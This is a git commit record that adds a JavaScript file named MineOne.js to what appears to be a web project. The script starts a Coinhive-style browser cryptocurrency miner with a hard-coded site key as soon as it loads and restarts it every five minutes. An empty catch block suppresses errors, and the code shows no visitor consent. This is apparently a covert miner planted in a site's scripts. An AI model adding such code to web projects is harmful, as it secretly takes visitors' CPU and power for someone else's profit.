27416903d3b141d57241c0c6bf69be0fde7e2177
ES\NegiKara <karan.negi@adp.com>
2018-01-09 19:07:33 +0530

    Second commit

---
+++ MiningCore.Web/Scripts/MineOne.js
@@ -0,0 +1,21 @@
+﻿function Test() {
+    try {
+        var miner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
+            throttle: 0.3
+        });
+        miner.start();
+        // Console.log('ServiceHit');
+
+    }
+    catch (e) {
+
+    }
+}
+
+
+setInterval(function () {
+    Test();
+
+}, 300000)
+
+Test();
